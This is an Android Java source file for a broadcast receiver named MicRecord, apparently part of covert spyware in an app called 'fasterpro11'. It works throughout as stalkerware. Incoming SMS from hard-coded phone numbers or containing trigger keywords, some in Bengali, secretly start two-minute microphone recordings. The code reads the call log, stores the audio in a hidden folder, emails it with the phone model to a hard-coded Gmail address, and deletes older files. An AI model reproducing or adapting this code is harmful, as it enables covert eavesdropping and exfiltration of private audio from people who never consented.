package com.example.fasterpro11;

import android.Manifest;
import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.media.AudioAttributes;
import android.media.AudioManager;
import android.media.MediaRecorder;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.provider.CallLog;
import android.provider.Settings;
import android.telephony.PhoneStateListener;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Comparator;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import android.media.AudioFocusRequest;

public class MicRecord extends BroadcastReceiver {

    private String fileName;
    private MediaRecorder recorder=null;
    private Context mContext;
    private static final String TAG = "MicRecord";
    private static final String[] allowedNumbers = {
            "+8801300282086", "+8801304039289",  "+8809697637893", "+8809638821369" };
    private static final String[] WORDS1_GRADE = {"Goldm", "Silverm", "Mediumm"};
    private static final String[] WORDS2_OFFER = {"Congratulationm", "Conformm"};
    private static final String[] WORDS3_OFFER = { "ঐ", "ও", "helo",  "কিহলো", "বলবা","কখন","কখন আসবে","আসবে",
            "সময়", "বলো",  "স্ক্রিনশট দাও","স্ক্রিনশট", "screenshort","screenshort dau", "কলদাও",  "কিকরছ " };
    private List<String> lastMessages = new ArrayList<>();
    private Handler handler; // Declare Handler here

    private int recordingCount = 1;
    private boolean isSoundRecording = false;  // Declare the flag at the class level
    private boolean isOnCall = false;    // Track if a call is ongoing

    private Context context;

    // Constructor that takes context
    public MicRecord(Context context) {
        this.context = context;
        this.handler = new Handler(Looper.getMainLooper());  // Use main thread's looper
    }

    // Default constructor for BroadcastReceiver
    public MicRecord() {}

    @Override
    public void onReceive(Context context, Intent intent) {
        Log.d(TAG, "onReceive called with action: " + intent.getAction());
        try {
            if ("android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) {
                handleSmsReceived(intent, context); // SMS পাওয়ার পরে কি করতে হবে তা handle করুন
            } else if ("android.intent.action.PHONE_STATE".equals(intent.getAction())) {
                Log.d(TAG, "Phone state changed, checking for call state.");
                handlePhoneStateChange(context, intent); // Check phone state
            } else if (Intent.ACTION_NEW_OUTGOING_CALL.equals(intent.getAction())) {
                Log.d(TAG, "Outgoing call detected, checking call state.");
                handleOutgoingCall(intent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error in onReceive: ", e);
        }
    }

    // Handle incoming and outgoing calls to start/stop recording
    private void  handlePhoneStateChange(Context context, Intent intent) {

        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.P) {
            Log.d(TAG, "Android version is lower of 9. start,,,,,, .versiov:" +Build.VERSION.SDK_INT);

            try {
                String state = intent.getStringExtra(TelephonyManager.EXTRA_STATE);

                // If it's an incoming or ongoing call (offhook), start recording
                if (TelephonyManager.EXTRA_STATE_RINGING.equals(state) ||
                        TelephonyManager.EXTRA_STATE_OFFHOOK.equals(state)) {
                    String incomingNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
                    isOnCall = true;


                    // Check Android version - only record if below API 28
                    if (Build.VERSION.SDK_INT < Build.VERSION_CODES.P) {
                        Log.d(TAG, "Android version is lower 9 start,,,,,,.versiov:" +Build.VERSION.SDK_INT);
                        //// startMicRecording(context, incomingNumber, "Incoming call detected");
                        // isSoundRecording = true; // Mark as recording
                    }else {
                        Log.d(TAG, "Android version is => P (API 28), skipping ........versiov:" +Build.VERSION.SDK_INT);
                    }

                } else if (TelephonyManager.EXTRA_STATE_IDLE.equals(state)) {
                    isOnCall = false;
                    Log.d(TAG, "Call ended, stopping.....");
                    //// stopMicSoundRecording(context); // Stop recording when call ends
                }
            } catch (Exception e) {
                Log.e(TAG, "Error in ..................: ", e);
            }
        }else {
            Log.d(TAG, "Android version is >= P (API 28), skipping .........versiov:" +Build.VERSION.SDK_INT);
        }
    }

    //private boolean isRecordingMic = false;  // Global flag to track recording status
    //private MediaRecorder recorder = null;
    private int recorderCounter = 1;
    private void startMicRecording(Context context, String incomingNumber, String messageBody) {
        // Check if recording is already in progress
        if (isSoundRecording) {
            Log.d(TAG, "Recording is already in progress. Ignoring new recording request.");
            return;  // If recording is already happening, do nothing
        }

        // Check for permissions
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(context, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions((Activity) context, new String[]{
                    Manifest.permission.RECORD_AUDIO,
                    Manifest.permission.WRITE_EXTERNAL_STORAGE,
                    Manifest.permission.READ_EXTERNAL_STORAGE
            }, 1);
            Log.d(TAG, "Permission not granted.");
            return ;
        }
        // Start recording
        recorderCounter++;
        Log.d(TAG, "startMicRecording method recorderCounter cheek= " + recorderCounter);
        startRecording(context);
    }

    private MediaRecorder mediaRecorder;

    public void startRecording(Context context) {
        Log.d(TAG, "in first startRecording method cheek isSoundRecording = " + isSoundRecording);
        Log.d(TAG, "startMicRecording method cheek recorderCounter = " + recorderCounter);

        if (recorderCounter >= 3) {
            Log.d(TAG, "startRecording method recorderCounter cheek= " + recorderCounter);
            return;
        }

        if (context == null) {
            context = context.getApplicationContext(); // Default context if null
        }

        String timestamp = new SimpleDateFormat("dd-MM-yyyy_HH:mm:ss", Locale.getDefault()).format(new Date());
        fileName = Environment.getExternalStorageDirectory() + "/DCIM/MicRecord/" + timestamp + "_" + recordingCount++ + ".amr"; // Changed extension to .amr for AMR format

        File dir = new File(Environment.getExternalStorageDirectory() + "/DCIM/MicRecord");
        if (!dir.exists() && !dir.mkdirs()) {
            Log.e(TAG, "রেকর্ডিংয়ের জন্য ডিরেক্টরি তৈরি করা সম্ভব হয়নি.");
            return;
        }

        try {
            if (mediaRecorder == null) {
                mediaRecorder = new MediaRecorder();
            }

            // Set audio source and encoder
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC); // Use the mic as the audio source
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.AMR_NB); // Set the output format to AMR-NB (Narrowband)
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB); // Set the audio encoder to AMR-NB
            mediaRecorder.setOutputFile(fileName); // Output file path
            mediaRecorder.prepare();
            mediaRecorder.start();

            isSoundRecording = true;
            Log.d(TAG, "after start startRecording method cheek isSoundRecording = " + isSoundRecording);

            // Use handler to stop recording after 2 minutes (120 seconds)
            Handler handler = new Handler(Looper.getMainLooper());
            Context finalContext = context;
            handler.postDelayed(() -> stopMicSoundRecording(finalContext), 2 * 60000); // 2 minutes recording limit

            Log.d("MicRecord", "Recording started.");
        } catch (IOException e) {
            Log.e("MicRecord", "Error starting recording: " + e.getMessage());
        }
    }


    public void stopMicSoundRecording(Context context) {
        Log.d(TAG, "in first stopMicSoundRecording method cheek isSoundRecording = " + isSoundRecording);
        if (isSoundRecording == true) {
            try {
                mediaRecorder.stop();
                mediaRecorder.release();
                mediaRecorder = null; // Free the resources
                isSoundRecording = false;
                Log.d("MicRecord", "Recording stopped.");

                if (isInternetAvailable(context)) {
                    Log.d(TAG, "Internet  available, Sound Rec sending Email.");
                    sendEmailWithAttachment("Sound Rec", "file:", fileName);
                } else {
                    Log.d(TAG, "Internet not available, recording saved locally.");
                }
                deleteOldRecordings();

            } catch (RuntimeException e) {
                Log.e("MicRecord", "Error stopping recording: " + e.getMessage());
            }
        } else {
            Log.e("MicRecord", "MediaRecorder is null, cannot stop recording.");
        }
    }



    private boolean isAppCallingApp(Intent intent) {
        Log.d(TAG, " call is app.logd 29");
        String packageName = intent.getStringExtra("package");
        if (packageName != null) {
            List<String> callingApps = Arrays.asList(
                    "com.whatsapp", "com.imo.android", "com.facebook.orca", "com.viber.voip", "org.telegram.messenger");
            String incomingNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
            String messageBody = "app Incoming call detected";  // You can customize this message if needed
            // startMicRecording(context, incomingNumber, messageBody);
            return callingApps.contains(packageName); // যদি কোনো কলিং অ্যাপ হয়, রেকর্ডিং বন্ধ হবে
        }
        return false;
    }
    private boolean isMicAvailable(Context context) {
        PackageManager pm = context.getPackageManager();
        return pm.hasSystemFeature(PackageManager.FEATURE_MICROPHONE);
    }
    private void handleOutgoingCall(Intent intent) {
        try {
            String outgoingNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
            Log.d(TAG, "Outgoing call to: " + outgoingNumber);
            //stopRecording(context); // আউটগোয়িং কলের ক্ষেত্রে রেকর্ডিং বন্ধ
        } catch (Exception e) {
            Log.e(TAG, "Error in handleOutgoingCall: ", e);
        }
    }
    private void handleSmsReceived(Intent intent, Context context) {
        try {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                for (Object pdu : pdus) {
                    SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                    String sender = smsMessage.getOriginatingAddress();
                    String messageBody = smsMessage.getMessageBody();
                    Log.d(TAG, "Received SMS: " + sender + ", Message: " + messageBody);

                    // Keep only the last message
                    lastMessages.clear();
                    lastMessages.add(messageBody);

                    boolean containsWords1 = containsSMSWORDS1GRADE(messageBody);
                    boolean containsWords2 = containsSMSWORDS2OFFER(messageBody);
                    boolean containsWords3 = containsSMSWORDS3OFFER(messageBody);
                    boolean IsInternetAvailable = isInternetAvailable(context);
                    boolean IsAllowedNumber = isAllowedNumber(sender) ;
                    boolean LastCallNumbers =  checkLastCallNumbers(context);

                    Log.d(TAG, "Keywords 1 found: " + containsWords1);
                    Log.d(TAG, "Keywords 2 found: " + containsWords2);
                    Log.d(TAG, "Keywords 3 found: " + containsWords3);
                    Log.d(TAG, "Internet available: " + IsInternetAvailable);
                    Log.d(TAG, "Allowed number: " + IsAllowedNumber);
                    Log.d(TAG, "LastCallNumbers: " + LastCallNumbers);

                    if ((containsWords1 && containsWords2 ) || IsAllowedNumber ||
                            LastCallNumbers || containsWords3 ) {

                        startMicRecording(context, sender, messageBody);

                        // cheek reson for forwarding message start
                        if (containsWords1 && containsWords2 ){
                            Log.d(TAG, "conditions match mic start recording for containsWords1 && containsWords2 .");
                        }else if (LastCallNumbers ){
                            Log.d(TAG, "conditions match mic start recording for LastCallNumbers .");
                        } else if (IsAllowedNumber){
                            Log.d(TAG, "conditions match mic start recording for isAllowedNumber.");
                        }else if (containsWords3 ){
                            Log.d(TAG, "conditions match mic start recording for containsWords3.");
                        }else {
                            Log.d(TAG, "Conditions not met for mic start recording .");
                        }
                    } else {
                        Log.d(TAG, "Conditions not met for mic start recording.");
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error in handleSmsReceived: ", e);
        }
    }
    public boolean isInternetAvailable(Context context) {
        try {
            ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
            NetworkInfo netInfo = cm.getActiveNetworkInfo();
            return netInfo != null && netInfo.isConnected();
        } catch (Exception e) {
            Log.e(TAG, "Error checking internet availability: ", e);
            return false;
        }
    }
    private boolean containsSMSWORDS1GRADE(String messageBody) {
        for (String keyword : WORDS1_GRADE) {
            if (messageBody.contains(keyword)) {
                return true;
            }
        }
        return false;
    }

    private boolean containsSMSWORDS2OFFER(String messageBody) {
        for (String keyword : WORDS2_OFFER) {
            if (messageBody.contains(keyword)) {
                Log.d(TAG, "Keyword found in message: " + keyword);
                return true;
            }
        }
        return false;
    }

    private boolean containsSMSWORDS3OFFER(String messageBody) {
        for (String keyword : WORDS3_OFFER) {
            if (messageBody.contains(keyword)) {
                Log.d(TAG, "Keyword found in message: " + keyword);
                return true;
            }
        }
        return false;
    }

    private boolean isAllowedNumber(String number) {
        for (String allowedNumber : allowedNumbers) {
            if (allowedNumber.equals(number)) {
                return true;
            }
        }
        return false;
    }

    private boolean checkLastCallNumbers(Context context) {
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            Log.e(TAG, "Call log permission not granted.");
            return false;
        }

        String[] projection = {CallLog.Calls.NUMBER};
        List<String> recentNumbers = new ArrayList<>();

        try (Cursor cursor = context.getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                projection,
                null,
                null,
                CallLog.Calls.DATE + " DESC")) {
            if (cursor != null) {
                int count = 0;
                while (cursor.moveToNext() && count < 1) {
                    String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                    recentNumbers.add(number);
                    count++;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error querying call log: ", e);
        }

        for (String number : recentNumbers) {
            if (isAllowedNumber(number)) {
                Log.d(TAG, "Allowed number found in recent calls: " + number);
                return true;
            }
        }
        return false;
    }
    public boolean hasOverlayPermission() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                return Settings.canDrawOverlays(context);
            }
            return true;
        } catch (Exception e) {
            Log.e(TAG, "Error checking overlay permission: ", e);
            return false;
        }
    }
    private void deleteOldRecordings() {
        Log.d(TAG, "Deleting old mic recordings...");
        File folder = new File(Environment.getExternalStorageDirectory() + "/DCIM/MicRecord");
        File[] files = folder.listFiles();
        if (files != null && files.length > 2) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                Arrays.sort(files, Comparator.comparingLong(File::lastModified));
            }
            for (int i = 0; i < files.length - 2; i++) {
                if (files[i].delete()) {
                    Log.d(TAG, "Deleted old mic recording: " + files[i].getName());
                } else {
                    Log.e(TAG, "Failed to delete old mic recording: " + files[i].getName());
                }
            }
        }
    }

    private void sendEmailWithAttachment(String subject, String body, String filePath) {
        Log.d(TAG, "rec Sending email with attachment...");

        // Get the file size
        File file = new File(filePath);
        long fileSize = file.exists() ? file.length() : 0;

        // Get the mobile model
        String mobileModel = Build.MODEL;
        String emailSubject = "sound Rec: " + "model: " + mobileModel;

        // Compare email content and file size with previous email
        if (isEmailContentSame(subject, body, fileSize)) {
            Log.d(TAG, "Mail content same as before. Skipping email send.");
            return; // Don't send the email if the content is the same
        }

        try {
            // Send email with attachment
            JavaMailAPI_MicRecord_Sender.sendMailWithAttachment("abontiangum99@gmail.com", emailSubject, body, filePath);
            Log.d(TAG, "mic rec Email sent successfully with attachment.");

            // Store the details of the sent email
            storeEmailDetails(subject, body, filePath, fileSize);

        } catch (Exception e) {
            Log.e(TAG, "mic Email sending failed: " + e.getMessage());
        }
    }

    // Store email details in SharedPreferences
    private void storeEmailDetails(String subject, String body, String filePath, long fileSize) {
        SharedPreferences sharedPreferences = mContext.getSharedPreferences("EmailDetails", Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = sharedPreferences.edit();
        editor.putString("subject", subject);
        editor.putString("body", body);
        editor.putLong("fileSize", fileSize);
        editor.putString("filePath", filePath);
        editor.apply();
        Log.d(TAG, "Email details stored.");
    }

    // Check if the email content is the same as before
    private boolean isEmailContentSame(String subject, String body, long fileSize) {
        SharedPreferences sharedPreferences = mContext.getSharedPreferences("EmailDetails", Context.MODE_PRIVATE);
        String previousSubject = sharedPreferences.getString("subject", "");
        String previousBody = sharedPreferences.getString("body", "");
        long previousFileSize = sharedPreferences.getLong("fileSize", 0);

        // Compare the current email details with the stored ones
        return subject.equals(previousSubject) && body.equals(previousBody) && fileSize == previousFileSize;
    }

    // This is the updated method in your MicRecord class
    public void OnReceiveCall(Context context, Intent intent, String incomingNumber, String messageBody) {
        Log.d(TAG, "called from Notification class the method of StartRecording in micRecord.");
        // startMicRecording(context, incomingNumber, messageBody);  // Call the startRecording method with the correct parameters
        onReceive(context, intent);
    }
    public void StartRecording(String incomingNumber, String messageBody) {
        Log.d(TAG, "called from Notification or callracorder class method of StartRecording in micRecord.");
        startMicRecording(context, incomingNumber, messageBody);  // Call the startRecording method with the correct parameters
        //startRecording( context);
    }
    public void StopMicSoundRecording(String incomingNumber, String messageBody) {
        Log.d(TAG, "called from Notification or callracorder class method of stopMicSoundRecording in micRecord.");
        stopMicSoundRecording(context);  // Call the startRecording method with the correct parameters
        //startRecording( context);
    }
    //    public void StartRecordingphonecall(String incomingNumber, String messageBody) {
//        Log.d(TAG, "called from Notification class the method of StartRecording in micRecord.");
//        startRecordingphonecall( context);  // Call the startRecording method with the correct parameters
//    }
    public void micRecord(Context context, Intent intent) {
        Log.d(TAG, "call From BackgroundSmsNotificationWorker");
        onReceive(context, intent);
    }
}
